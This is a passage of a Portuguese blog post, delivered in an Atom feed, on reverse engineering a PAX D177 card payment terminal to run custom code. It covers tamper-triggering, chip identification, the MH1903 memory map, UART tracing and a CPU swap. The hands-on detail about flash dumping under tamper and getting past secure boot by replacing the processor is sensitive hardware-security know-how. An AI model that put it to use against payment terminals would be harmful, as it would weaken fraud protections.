<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://lucasteske.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucasteske.dev/" rel="alternate" type="text/html" hreflang="pt" /><updated>2025-09-05T22:00:48+00:00</updated><id>https://lucasteske.dev/feed.xml</id><title type="html">Lets Hack It</title><subtitle>Sou Lucas Teske, gosto de Eletr√¥nica, Computa√ß√£o, F√≠sica.  Todos os hacks que eu fizer, ser√£o colocados aqui. Aceito sugest√µes :D</subtitle><author><name>Lucas Teske</name><email>letshackit@nvx.li</email></author><entry><title type="html">Rodando c√≥digo em uma m√°quina de cart√£o de cr√©dito PAX (parte 1)</title><link href="https://lucasteske.dev/2025/09/running-code-in-pax-machines" rel="alternate" type="text/html" title="Rodando c√≥digo em uma m√°quina de cart√£o de cr√©dito PAX (parte 1)" /><published>2025-09-05T19:30:00+00:00</published><updated>2025-09-05T19:30:00+00:00</updated><id>https://lucasteske.dev/2025/09/running-code-in-pax-machines</id><content type="html" xml:base="https://lucasteske.dev/2025/09/running-code-in-pax-machines"><![CDATA[<h2 id="disclaimer">Disclaimer</h2>

<p><strong>Todos os procedimentos descritos aqui foram feitos com material dispon√≠vel publicamente</strong> - Nenhuma falha de seguran√ßa foi realmente explorada aqui para obter execu√ß√£o de c√≥digo. A t√©cnica de troca de processador <strong>n√£o contorna as prote√ß√µes contra viola√ß√µes nem permite que uma m√°quina falsa efetue pagamentos.</strong></p>

<p>As m√°quinas de pagamento com cart√£o de cr√©dito no Brasil <em>geralmente</em> est√£o no estado da arte em rela√ß√£o √†s medidas de seguran√ßa. Lembro-me uma vez que um funcion√°rio da Elavon me disse que <strong>o Brasil recebeu todos os primeiros lan√ßamentos de m√°quinas e sistemas de pagamento</strong>. Quando perguntei por que, ele disse: <strong>as fraudes no Brasil s√£o sofisticadas o suficiente, que se o sistema for seguro o suficiente para o Brasil, funciona em qualquer lugar do mundo</strong>.</p>

<p>No futuro, farei um artigo sobre as medidas de seguran√ßa que tanto a MegaHunt, quanto a PAX e as empresas brasileiras implementam em suas m√°quinas para evitar que os sistemas sejam adulterados.</p>

<p>Se voc√™ estiver compartilhando / comentando sobre este artigo, por favor coloque o mesmo aviso de isen√ß√£o de responsabilidade l√°. N√£o me importo de usar as informa√ß√µes aqui para fazer novos artigos, mas o Brasil sofre <strong>muito</strong> com fake news (especialmente envolvendo hardware de seguran√ßa feito aqui) e algu√©m pode pensar que isso torna poss√≠vel hackear seus cart√µes de cr√©dito ou contas (voc√™ sabe, pessoas sem conhecimento suficiente para realmente entender o que est√° envolvido).</p>

<h3 id="notas-iniciais">Notas iniciais</h3>

<p>Este artigo est√° meio incompleto. Ainda vou publicar a engenharia reversa do boot rom e como criei um emulador para mapear melhor o que os firmwares fazem. Aqui eu apenas menciono brevemente que fiz um emulador e acho que isso merece seu pr√≥prio artigo. Vou atualizar esta nota inicial quando eles forem publicados.</p>

<p>Eu quero agradecer ao <a href="https://www.linkedin.com/in/gutem/">Gutem</a> e ao <a href="https://www.instagram.com/penegui">Penegui</a> por uma revis√£o t√©cnica rapida do conte√∫do do artigo, e a Pag, a qual deu uma resposta super r√°pida e amig√°vel quando enviei este artigo a eles. Uma pequena linha do tempo de como rolou o processo est√° no fim da pagina.</p>

<h2 id="m√°quinas-de-pagamento-com-cart√£o-de-cr√©dito">M√°quinas de pagamento com cart√£o de cr√©dito</h2>

<p>Aqui no Brasil, existem v√°rias empresas que atuam como gateways de pagamento e esse tipo de coisa. Eu diria que as maiores s√£o <a href="https://pagbank.com.br/">PagSeguro</a> e <a href="https://mercadopago.com.br/">MercadoPago</a>. Enquanto o PagSeguro √© originalmente do Brasil, o MercadoPago √© da Argentina e veio de um neg√≥cio completamente diferente (MercadoLivre, que √© basicamente o equivalente sul-americano do eBay).</p>

<p>H√° tamb√©m muitos bancos que hoje em dia possuem m√°quinas de pagamento, mas eu diria que a maioria deles, sen√£o todos, compram as m√°quinas de um fabricante brasileiro chamado <a href="https://www.tectoy.com.br/">TecToy</a> (o que anteriormente era feito pela <a href="https://www.transire.com/">Transire</a>, mas agora eles fundiram e s√£o a mesma empresa).</p>

<p>E eu acho muito engra√ßado, porque a TecToy √© uma fabricante de brinquedos, mas eles s√£o enormes e antigos e uma das poucas empresas sobreviventes que <strong>realmente fabricam hardware</strong> no Brasil. Vale ressaltar que as m√°quinas n√£o s√£o projetadas por eles, mas principalmente por OEMs chineses como a <a href="https://www.paxglobal.com.hk/">PAX</a> ou <a href="https://www.sunmi.com/">Sunmi</a>.</p>

<p>No Brasil, √© muito f√°cil e barato para conseguir estas m√°quinas basicamente em qualquer lugar. Voc√™ consegue achar as m√°quinas descritas aqui no pr√≥prio site das empresas de pagamento (tente procurar M√°quinas de Cart√£o no mercado livre ou google ;D )</p>

<p>Em resumo: Geralmente elas s√£o m√°quinas baseadas na PAX, com o mesmo ‚ÄúSistema Operacional‚Äù mas uma aplica√ß√£o especifica customizada. Al√©m disso a Pag tamb√©m faz servi√ßo de ‚ÄúOEM‚Äù e <strong>muitas</strong> empresas de pagamento usam as m√°quinas deles como base. Ent√£o basicamente, se voc√™ comprar uma m√°quina de cart√£o qualquer, a grande chance √© que seja indiretamente deles tamb√©m.</p>

<p>Pra simplificar, aqui est√£o as correspond√™ncias dos modelos para a PAX:</p>

<ul>
  <li>Mini Chip 3 - PAX D188 (Baremetal)</li>
  <li>Moder Plus 2 - PAX D195 (Linux OS)</li>
  <li>Moder Pro 2 - PAX Q92S (Linux OS)</li>
  <li>Mini NFC 2 - PAX D177 (Baremetal)</li>
  <li>Mini Smart 2 - Sunmi P2 (Android)</li>
</ul>

<p>Pra esse artigo eu acabei usando uma NFC2 que √© uma simples e barata PAX D177. Vale notar que a D188 parece uma m√°quina completamente diferente, mas usa o mesmo processador (apenas em formato BGA e n√£o QFN88), tem um modem 4G a mais e uma tela maior. A firmware que roda em ambas <strong>√© a mesma</strong> (runtime selection).</p>

<h2 id="primeiros-trabalhos-e-identifica√ß√£o-de-coisas">Primeiros trabalhos e Identifica√ß√£o de coisas</h2>

<p>Geralmente quando estou fazendo engenharia reversa em hardwares considerados seguros, eu pe√ßo <strong>pelo menos</strong> tr√™s m√°quinas quando poss√≠vel. Por que geralmente rola da seguinte maneira:</p>

<ol>
  <li>Vou abrir, e deixar <strong>todas</strong> prote√ß√µes dispararem.</li>
  <li>Vou usar para <strong>tentar</strong> bypassar todas prote√ß√µes (caso seja meu objetivo)</li>
  <li>Vou manter como est√°, para poder ter um modelo de refer√™ncia para os estudos.</li>
</ol>

<p>Nesse cen√°rio especifico, eu apenas queria rodar DOOM nela. Por que, se compute, ela precisa de DOOM.</p>

<p>Baseado nas minhas experiencias anteriores fazendo engenharia reversa nestas maquinas, eu j√° sabia o que esperar. Este artigo √© apenas um resumo do caminho (dado que levei alguns anos pra chegar ao estado atual) que me lembro que segui. Ent√£o o que eu estava esperando era basicamente isso:</p>

<ol>
  <li>Seguran√ßa pesada
    <ol>
      <li>Prote√ß√£o contra tamper</li>
      <li>Prote√ß√£o contra clock-glitching</li>
      <li>Proet√ß√£o contra manipulacao de RNG</li>
      <li>Assinaturas de c√≥digo</li>
      <li>Criptografia de C√≥digo</li>
    </ol>
  </li>
  <li>Muita frustra√ß√£o</li>
</ol>

<p>Eu podia seguir dois caminhos: exploitar o c√≥digo que roda, ou trocar a CPU. Para exploitar, eu teria que achar uma falha de seguran√ßa que permitisse execu√ß√£o de c√≥digo via Bluetooth, Smartcard, NFC ou USB, dado que estas s√£o as √∫nicas interfaces dispon√≠veis. Para isso, eu teria que ter todo c√≥digo, e como voc√™s v√£o ver mais pra frente, para est√° maquina em especifico, isso n√£o era exatamente poss√≠vel.</p>

<p>Segundo jeito era basicamente ver qual CPU estava na placa, comprar uma nova e trocar. O problema mesmo, √© achar a CPU pra vender.</p>

<p>Mas, de um jeito ou de outro, eu precisaria abrir e identificar como as coisas est√£o ligadas e o que √© usado. De refer√™ncia, esta √© a maquina que usei:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/cb3d6416e80906d1e1a3cfa7c27ec46c_MD5.jpeg" alt="" /></p>

<p>No lado de tr√°s, alguns parafusos que s√£o facilmente removidos. Eu geralmente fa√ßo isso com a <strong>m√°quina ligada</strong>, pois desta maneira consigo ver que a√ß√µes minhas acionam as prote√ß√µes anti-tamper.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/942368afcd3a8b5c2f6280b0686279ad_MD5.jpeg" alt="" /></p>

<p>Remover os parafusos, por√©m, n√£o disparou nenhuma prote√ß√£o. Apesar disso, assim que a tampa √© removida, a tela indica que duas prote√ß√µes foram acionadas.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9a88c682e238fdb16c61122c76c2e14c_MD5.jpeg" alt="" /></p>

<p>na parte de tr√°s do case, h√° alguns pontos de borracha-carbono, que encostam nos pontos de detec√ß√£o na PCB. Eles funcionam basicamente da mesma maneira que os bot√µes de um controle de video-game funcionam, s√≥ que neste caso, eles s√≥ garantem que ‚Äúo bot√£o est√° sempre apertado‚Äù.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/3744913eb7cc7b866b64eb363d6fbbe5_MD5.jpeg" alt="" /></p>

<p>E por alguma raz√£o, a m√°quina decidiu falar pra gente quais pontos de tamper foram acionados :)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9b728a005ceb00f991633d8d6ece65ed_MD5.jpeg" alt="" /></p>

<p>Ah, isso tamb√©m reseta pelo boot, ent√£o se voc√™ soldar os pinos de tamper (pra for√ßar eles a ficarem em contato) voc√™ consegue identificar os nomes de cada um hehe :)</p>

<p>Ent√£o, isso √© a parte de baixo. Podemos ver algumas coisas, por exemplo a bateria-moeda na esquerda e uma grande PCB verde que parece in√∫til. Ela basicamente est√° em cima de todo circuito de leitura do cart√£o e os controladores da m√°quina.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/4454b7008ef72e53db283abd4afafb86_MD5.jpeg" alt="" /></p>

<p>Por√©m, mesmo que pare√ßa in√∫til esta PCB, n√£o a subestime: ela √© basicamente uma PCB de 4 layers com uma mesh DENSA dentro dela. Qualquer dano ou remo√ß√£o, aciona outro ponto de tamper. S√≥ pra ter uma ideia, isso daqui √© a PCB escaneada:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/930418d0ee33dd3362d0ac27de43fa8e_MD5.jpeg" alt="" /></p>

<p>Removendo todo pl√°stico e a PCB, chegamos a placa principal:
<img src="/assets/Running code in a PAX Credit Card Payment Machine/1d47f48f4cf614dd72e26c37c839895c_MD5.jpeg" alt="" /></p>

<p>E temos muitas coisas aqui, mas as coisas que nos importam est√£o na parte de baixo.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/e808d21c32ba0866a386d155077709e4_MD5.jpeg" alt="" /></p>

<p>Aqui conseguimos ver algumas coisas interessantes:</p>

<ul>
  <li>MH1903 - Nosso principal SoC (CPU)</li>
  <li>NXP 8035S - PHY de Interface de SmartCard</li>
  <li>FM17660 - Leitor NFC</li>
  <li>XM25Q65 - Mem√≥ria Flash SPI de 16MB</li>
</ul>

<p>(E como voc√™ adivinhou, ativamos quase todos os pontos de tamper na parte de tr√°s)</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/55e76a7d0d22410d56bada5afad18bd8_MD5.jpeg" alt="" /></p>

<p>A mem√≥ria flash, conseguimos dumpa-la. Eu tenho amostras tanto com tamper quanto sem tamper. O bypass da detec√ß√£o de tamper fica como exercicio ao leitor :) - Mas se voc√™ quiser entender como funciona, voc√™ pode dumpar ela diretamente mesmo com tamper, por que o tamper n√£o apaga a mem√≥ria flash inteira, apenas a por√ß√£o onde tem conte√∫do sens√≠vel para comunica√ß√£o com os servidores de pagamento.</p>

<p>Eu estava esperando que a mem√≥ria flash fosse sempre criptografada, mas n√£o √©. Apesar disso, n√£o d√° pra mudar os conte√∫dos (c√≥digo) dela pois √© tudo assinado. ent√£o conseguimos usar para engenharia reversa, mas n√£o para execu√ß√£o de c√≥digo. Ainda assim, √© massa. Temos 16MB de flash, ent√£o podemos colocar um WAD inteiro do DOOM nela! :D</p>

<h2 id="o-que-sabemos-sobre-o-mh1903">O que sabemos sobre o MH1903</h2>

<p>Aqui √© quando bicho pega. O SoC est√° por tr√°s de um v√©u de obscuridade. O n√∫cleo √© feito pela megahunt, que basicamente s√≥ prov√™ essas informa√ß√µes:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/cf4f007fbd8b87c83cb0e4f3c3560cc7_MD5.jpeg" alt="" />
(veja <a href="https://www.megahuntmicro.com/en/index.php?catid=5">https://www.megahuntmicro.com/en/index.php?catid=5</a> )</p>

<p>Indo um pouco mais a fundo no google, a gente consegue achar algumas informa√ß√µes a mais de alguns vendedores. Ele tem <strong>muitas</strong> varia√ß√µes, mas em resumo, o n√∫cleo √© o mesmo. S√≥ mudando quantos pinos est√£o expostos, quantidade de mem√≥ria flash, ram etc‚Ä¶ Essa vers√£o especifica √© a QFN88, que tem essas especifica√ß√µes:</p>

<ul>
  <li>RAM: 1MB</li>
  <li>FLASH: 1MB</li>
  <li>SPI: 4</li>
  <li>ADC: 5</li>
  <li>DAC: 1</li>
  <li>GPIO: 64</li>
  <li>USB: 1</li>
  <li>Serial: 4</li>
</ul>

<p>Como voc√™s podem ver, essa vers√£o tem uma mem√≥ria flash inteira, o que √© uma pena pra mim. Ainda estou montando meu equipamento para inspe√ß√µes diretas no chip. Eu j√° fiz alguns decaps, e a mem√≥ria flash n√£o est√° embutida no mesmo silicio, mas apenas colada em cima do chip principal e ligada atrav√©s de fios. Eu ouvi alguns amigos da industria de semicondutores dizer, que a raz√£o disso √© que o processo de fabrica√ß√£o entre mem√≥rias flash e CPUs diferente um pouco e √© dif√≠cil unificar ambos. Por isso, geralmente √© prefer√≠vel faze-los separados (especialmente caso precise de uma densidade muito alta).</p>

<p>Uma coisa pra se notar, as vers√µes BGA do SoC n√£o tem mem√≥ria flash embutida, ent√£o elas s√£o obrigadas a carregar de uma flash externa. Spoiler: A D188 tem duas mem√≥rias flash na placa :)</p>

<p>E tamb√©m temos uma variante MH1903S, que tem mais flash, mas menos RAM / GPIO / SPI</p>

<ul>
  <li>RAM: 640KB</li>
  <li>FLASH: 4MB</li>
  <li>SPI: 3</li>
  <li>ADC: 6</li>
  <li>DAC: 1</li>
  <li>GPIO: 56</li>
  <li>USB: 1</li>
  <li>Serial: 3</li>
</ul>

<p>Ent√£o, o google n√£o me deu muita informa√ß√£o sobre, apesar de eu ter achado <em>algumas</em> SDK no github (a maioria mirror dos git chin√™s) e eu tive que recorrer ao Baidu. Essa parte levou um bom tempo, por que muitas informa√ß√µes n√£o est√£o dispon√≠vel fora da china continental, e existem muitas varia√ß√µes do MH1903. Eu achei v√°rios datasheets com informa√ß√µes conflitantes, e boa parte deles eu tive que pagar para baixar do CSDN. Por sorte, existem alguns brokers que fazem isso por voc√™. No fim desta p√°gina h√° um link com todos os datasheets relevantes que eu achei, caso voc√™ precise. S√≥ esteja avisado: Mesmo neles, h√° muita informa√ß√£o omitida e conflitante.</p>

<p>T√°, mas como testei ent√£o todas as suposi√ß√µes que fiz sobre o chip? Bom, eu achei <em>por um acaso</em> que existe uma placa chinesa similar ao Arduino, feito pela LUAT chamada AIR105. Parece nada a ver, mas uma pesquisa no baidu indicou que o AIR105 usa um n√∫cleo MH1903S. E o lado bom, AIR105 √© f√°cilmente compr√°vel na Aliexpress: <a href="https://s.click.aliexpress.com/e/_oBLNTrc">https://s.click.aliexpress.com/e/_oBLNTrc</a></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/427a383619233fb72eef5161e05511e8_MD5.jpeg" alt="" /></p>

<p>Eu compreo alguns, decapei alguns e adivinha s√≥: realmente √© um MH1903S :D</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/9138886ea831b06c18888099fd0e26a6_MD5.jpeg" alt="" /></p>

<p>Pra compara√ß√£o, eu tamb√©m decapei um SoC da m√°quina, e a escrita indicava 1903A:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/feb55758da95a7ecb62f02451c058606_MD5.jpeg" alt="" /></p>

<p>Ah, e lembra que falei que a memoria flash era colada no chip principal? Aqui t√° uma foto mostrando ambos (E malz, eu ainda n√£o fiz um equipamento pra focus stacking). A mem√≥ria flash est√° fora de foco na direita. Os boundwires est√£o mortos por que usei √°cido n√≠trico 78% e os fios eram de cobre.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/551efee7006a314cf9d0b9257bb61edc_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/4fd85cc5f052df9b22c267e7559b0af5_MD5.jpeg" alt="" /></p>

<p>Ent√£o basicamente, eu poderia assumir que eles s√£o pelo menos similares. Os Datasheets de ambos tamb√©m dizem a mesma coisa (√∫nica diferen√ßa mesmo √© flash e ram).</p>

<p>O diagrama de blocos pra essa CPU est√° no datasheet, e √© basicamente <strong>a √∫nica</strong> informa√ß√£o que bate em rela√ß√£o a todos datasheets:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/8cd0cc82e5b752464a0617442e0c765f_MD5.jpeg" alt="" /></p>

<p>O SC300 √© na verdade uma especifica√ß√£o de ARM chamada <strong>SecurCore</strong>. √â um Cortex M3 (no caso do MH190x √© um M4F) com alguns recursos de seguran√ßa. Por exemplo, mesmo eles sendo simples processadores ARM de 32 bit, eles tem algumas prote√ß√µes de mem√≥ria para restringir acessos entre OS &lt;&gt; APP (uma vers√£o primitiva do TrustZone). Ah e claro, as especifica√ß√µes oficiais s√≥ est√£o dispon√≠veis atrav√©s de NDA, ent√£o s√≥ podemos deduzir o que exatamente a especifica√ß√£o diz. Pra uma ideia: As CPUs no seu cart√£o de cr√©dito, seguem a mesma especifica√ß√£o.</p>

<p>Os datasheets tamb√©m especificam um mapa da mem√≥ria, o qual todos datasheets concordam. Por√©m, <strong>claramente</strong> n√£o √© tudo que o dispositivo tem. Por exemplo, a MH diz que a CPU tem acelerador de RSA, AES e hashes via hardware, mas n√£o existe nenhuma descri√ß√£o deles no datasheet. Depois eu descobri que eles s√≥ est√£o obscurecendo o conte√∫do ou precisam de um NDA. Eu vou eventualmente fazer engenharia reversa de todos aplicativos que eu dumpei e tamb√©m de uns binarios de SDK que eu achei pela internet. Ah, e por favor, se esses endere√ßos baterem com algum dispositivo que voc√™ usa, me avise. Na minha experi√™ncia os dispositivos chineses tentam ser compat√≠veis com alguma coisa do mercado, mas nada que achei indica ser um clone direto de algum SoC do mercado. (Eu especulei ser um STM32 ou ATMSAMD, mas n√£o bate).</p>

<table>
  <thead>
    <tr>
      <th>Address Range</th>
      <th>Peripheral name</th>
      <th>Bus Name</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0x4000_0000-0x4000_03FF</td>
      <td>SSC</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_0800-0x4000_0BFF</td>
      <td>DMA</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_0C00-0x4000_0FFF</td>
      <td>USB</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_1000-0x4000_13FF</td>
      <td>LCD</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4000_8000-0x4000_BFFF</td>
      <td>OTP</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4006_0000-0x4006_FFFF</td>
      <td>DCMI</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4008_0000-0x4008_FFFF</td>
      <td>CACHE</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x400A_2000-0x400A_2FFF</td>
      <td>QSPI</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x400A_3000-0x400A_3FFF</td>
      <td>SPIM5</td>
      <td>AHB</td>
    </tr>
    <tr>
      <td>0x4001_0000-0x4001_0FFF</td>
      <td>SCI0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_2000-0x4001_2FFF</td>
      <td>CRC</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_3000-0x4001_3FFF</td>
      <td>Timer0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_4000-0x4001_4FFF</td>
      <td>ADC</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_5000-0x4001_5FFF</td>
      <td>SCI2</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_6000-0x4001_6FFF</td>
      <td>UART0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_7000-0x4001_7FFF</td>
      <td>UART1</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_8000-0x4001_8FFF</td>
      <td>SPIM1</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_9000-0x4001_9FFF</td>
      <td>SPIM2</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_A000-0x4001_AFFF</td>
      <td>SPIM0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_B000-0x4001_BFFF</td>
      <td>SPIS0</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_C000-0x4001_CFFF</td>
      <td>Watchdog</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_D000-0x4001_DFFF</td>
      <td>GPIO</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_E000-0x4001_EFFF</td>
      <td>TRNG</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4001_F000-0x4001_FFFF</td>
      <td>SYS_CTRL</td>
      <td>APB0</td>
    </tr>
    <tr>
      <td>0x4002_0000-0x4002_FFFF</td>
      <td>MSR</td>
      <td>APB1</td>
    </tr>
    <tr>
      <td>0x4003_0000-0x4003_7FFF</td>
      <td>BPU</td>
      <td>APB2</td>
    </tr>
    <tr>
      <td>0x4004_4000-0x4004_4FFF</td>
      <td>UART2</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_5000-0x4004_5FFF</td>
      <td>UART3</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_8000-0x4004_8FFF</td>
      <td>KEYBOARD</td>
      <td>APB3</td>
    </tr>
    <tr>
      <td>0x4004_9000-0x4004_9FFF</td>
      <td>I2C0</td>
      <td>APB3</td>
    </tr>
  </tbody>
</table>

<p>A RAM est√° mapeada no lugar esperado pra esses ARM Cortex. Come√ßa em 0x2000_0000 e v√£o at√© o tamanho m√°ximo da RAM (640KB pro MH1903S e 1MB pro MH1903). As bit-bands tamb√©m est√£o no lugar esperado, 0x2200_0000 pra RAM. Tamb√©m h√° mais devices que n√£o est√£o listados acima, esses ter√£o seu pr√≥prio artigo depois que eu terminar de mapear tudo.</p>

<p>O datasheet principal mostra duas variantes do QFN88, uma tendo um sufixo <code class="language-plaintext highlighter-rouge">_J</code>. A vers√£o n√£o J tem um regulador 3.3V interno, que √© muito bom para placas tipo o AIR105. Fazendo engenharia reversa da placa da D177, parece que o pin-out bate exatamente com a variante J. Voc√™s ver√£o que eu tive um grande problema por que eu assumi que o datasheet estava correto XD</p>

<h2 id="descobrindo-como-as-coisas-est√£o-conectadas">Descobrindo como as coisas est√£o conectadas</h2>

<p>A primeira coisa que preciso descobrir √© <strong>pelo menos</strong> onde a UART est√° (se est√°). Eu sei que o USB da m√°quina √© fixo, por que os pinos s√£o fixos. Mas por alguma raz√£o eu n√£o consegui ativar a bootrom pela USB ent√£o tive que ca√ßar a UART.</p>

<p>Os pinos da UART geralmente est√£o exposto de alguma maneira, para diagn√≥sticos durante a fabrica√ß√£o. Isso ou o JTAG (ou mais especificamente aqui, o SWD). Por√©m no caso desse micro controlador, eles est√£o desativados durante o boot, ent√£o decidi n√£o perder muito tempo tentando achar eles na placa.</p>

<p>T√°, mas como eu consigo achar as coisas na placa? Bom, eu geralmente removo <strong>todos</strong> componentes da placa e fa√ßo um scan dela (usando scanner normal de papel). E a√≠ eu fa√ßo um overlay com o pinout da CPU e tra√ßo at√© onde vai. Uma boa aplica√ß√£o pra isso √© o <a href="https://inkscape.org/">Inkscape</a>. Ele permite desenhar tudo vetorizado e as imagens de scanner dom√©stico tem 1:1 com tamanho real dela (ent√£o caso voc√™ precise de medidas, elas s√£o realistas).</p>

<p>Ent√£o desenho ret√¢ngulos cinzas e coloco os nomes:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/bacf2a2ebe249871db70adb98d4fa2b7_MD5.jpeg" alt="" /></p>

<p>Eu tamb√©m marco as vias, por que essas placas costumam ser multi-layer e voc√™ vai precisar de tudo pra seguir elas:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/fdeaa9034f0f2a2217c7d55f05e2e6f4_MD5.jpeg" alt="" /></p>

<p>Por exemplo, o TX e RX passa atrav√©s da parte frontal da PCB tamb√©m (esquece esse desalinhamento, nao sei por que a imagem bugou).</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/652fd1331e348c4861938eadf3f0a824_MD5.jpeg" alt="" /></p>

<p>Depois de seguir tudo, eu cheguei em 2 de 5 testpads, no canto direito da parte de tr√°s da PCB, os quais marquei tamb√©m no Inkscape.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/985831c28a29ecc016e52f876980476a_MD5.jpeg" alt="" /></p>

<p>Agora que eu tinha a UART, eu poderia usa-la para reprogramar a m√°quina ap√≥s a troca da CPU. E pra aqueles que est√£o pensando: a UART, para a aplica√ß√£o da m√°quina, √© basicamente a mesma coisa do USB e do bluetooth, ent√£o (geralmente) n√£o h√° leak de informa√ß√µes ali. √â exatamente o que o aplicativo m√≥vel acessa. E caso voc√™ queira explorar, voc√™ pode usar USB ou Bluetooth que elas v√£o agir da mesma maneira desta UART.</p>

<h2 id="troca-de-cpu">Troca de CPU</h2>

<p>Um dos jeitos mais f√°ceis que eu consigo rodar um c√≥digo nela e pulando a parte de tentar bypassar o secureboot, √© apenas comprar uma CPU nova e trocar. Alguns podem considerar isso uma vulnerabilidade, mas eu pessoalmente n√£o considero: Mesmo que algu√©m tenha acesso a todo c√≥digo que roda nas m√°quinas, ainda assim eles precisam das chaves e dos dados carregados na NVRAM para a transa√ß√£o de cart√£o. Eu j√° vi uns tempos atr√°s o caso de algumas m√°quinas que armazenavam isso na mem√≥ria flash (ent√£o se voc√™ quebrasse a CPU antes de ela detectar o tamper, o conte√∫do estava l√°). Mas este n√£o √© o caso desta m√°quina.</p>

<p>Infelizmente esses MH1903 s√£o bem raros pra comprar fora da china continental. De tempos em tempos eles aparecem na Aliexpress. Aqui est√° um link <a href="https://s.click.aliexpress.com/e/_oBMot6n">https://s.click.aliexpress.com/e/_oBMot6n</a> embora ele provavelmente vai estar morto quando voc√™ estiver lendo isso.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/c94d5244a68733e5cfbec91c6f08f5f0_MD5.jpeg" alt="" /></p>

<p>√â uma CPU bem cara, R$34 de CPU e ainda R$15 de taxad por dispositivo. E ainda tem os R$28 de frete. Eu comprei 5 deles (caso eu precisasse de mais) e saiu por volta de R$150 com o frete.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/edad8e809adbb209bf4eca20043fd1dd_MD5.jpeg" alt="" /></p>

<p>Uns anos atr√°s eu tentei trocar a CPU dessa maquina sem nenhum sucesso. Ent√£o eu pensei que a variante que eu tinha n√£o era a J, mas a mesma do AIR105 (o que faria sentido) e isso me deixou triste. Mas recentemente eu estava colecionando as bootroms, e decidi trocar um AIR105 por um MH1903 que comprei apenas para dumpar o bootloader (mais bootloaders == mais informa√ß√µes).</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/8fabf3473c8ee086fdea127b537c4ef6_MD5.jpeg" alt="" /></p>

<p>E depois de fazer isso, eu percebi que a placa estava full morta. Nenhuma energia al√©m dos 5V. Depois de trocar eu notei uma coisa no datasheet:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/725ff8aa056e6d095a4ac1ea1882fa1a_MD5.jpeg" alt="" /></p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/839cea0de243ff5cc485a19e6a0fb849_MD5.jpeg" alt="" /></p>

<p>Uma das diferen√ßas entre o J e n√£o J, √© que a vers√£o <strong>n√£o J</strong> (nesse caso AIR105) tem um LDO interno de 3.3V. E olhando os esquem√°ticos do AIR105, adivinha s√≥? N√£o existe nenhum outro regulador na placa. √â tudo alimentado por esse LDO.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/87356f1a4622aa38a746dd5676123bf5_MD5.jpeg" alt="" /></p>

<p>Ent√£o, fazia sentido n√£o ter nada no 3.3V dado que a vers√£o J nao tinha o regulador. Ent√£o eu decidi novamente trocar a CPU da D177. Pra isso, eu decidi come√ßar do zero: M√°quina rec√©m tirada da caixa e um MH1903 que nao tinha usado. O resultado? Nada ainda. Nada na UART, nada na USB (e ambos deveriam ter atividade da bootrom).</p>

<p>O que acontecia √© que, a bootrom nunca respondia as chamadas de handshake do meu leitor, o que era estranho. Decidi tentar no AIR105, at√© que notei que a placa sempre resetava quando eu enviava o sinal RTS na porta serial.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/fd96942840f9a3924a76e5d843ee88a2_MD5.jpeg" alt="" /></p>

<p>Isso me fez pensar: como ele tava resetando a placa? Olhando pela pinagem do chip, n√£o existe reset. Mas olhando pelo esquema do AIR105 vemos uma coisa interessante:</p>

